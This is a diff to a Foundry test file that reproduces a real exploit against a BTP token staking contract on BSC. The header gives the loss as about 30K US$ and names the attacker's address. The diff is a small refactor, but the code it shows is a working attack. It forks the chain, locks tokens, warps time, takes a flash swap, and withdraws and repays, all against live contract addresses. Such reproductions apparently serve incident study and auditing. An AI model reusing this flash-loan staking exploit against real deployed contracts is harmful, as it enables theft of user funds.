@@ -2,7 +2,6 @@
 pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
-import "./../interface.sol";
 
 // @KeyInfo - Total Lost : ~30K US$
 // Attacker : https://bscscan.com/address/0x878a36edfb757e8640ff78b612f839b63adc2e51
@@ -29,18 +28,17 @@ contract ContractTest is Test {
 
     IERC20 BTP = IERC20(0x40F75eD09c7Bc89Bf596cE0fF6FB2ff8D02aC019);
     IStaking Staking = IStaking(0x9D6d817ea5d4A69fF4C4509bea8F9b2534Cec108);
-    Uni_Pair_V2 Pair = Uni_Pair_V2(0x858DE6F832c9b92E2EA5C18582551ccd6add0295);
-    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
+    IUniswapV2Pair Pair = IUniswapV2Pair(0x858DE6F832c9b92E2EA5C18582551ccd6add0295);
     uint256 flashAmount = 219_349 * 1e18;
 
     function setUp() public {
-        cheats.createSelectFork("bsc", 28_176_675);
+        vm.createSelectFork("bsc", 28_176_675);
     }
 
     function testExploit() public {
         firstLock();
 
-        cheats.warp(block.timestamp + 6 * 30 * 24 * 60 * 60 + 1000); // lock 6 month
+        vm.warp(block.timestamp + 6 * 30 * 24 * 60 * 60 + 1000); // lock 6 month
 
         Pair.swap(flashAmount, 0, address(this), new bytes(1));
 
@@ -55,7 +53,7 @@ contract ContractTest is Test {
         BTP.approve(address(Staking), type(uint256).max);
         Staking.Lock_Token(1, BTP.balanceOf(address(this)));
         Staking.withdraw(1);
-        BTP.transfer(msg.sender, flashAmount * 10_000 / 9975 + 1000);
+        BTP.transfer(msg.sender, (flashAmount * 10_000) / 9975 + 1000);
     }
 
 }
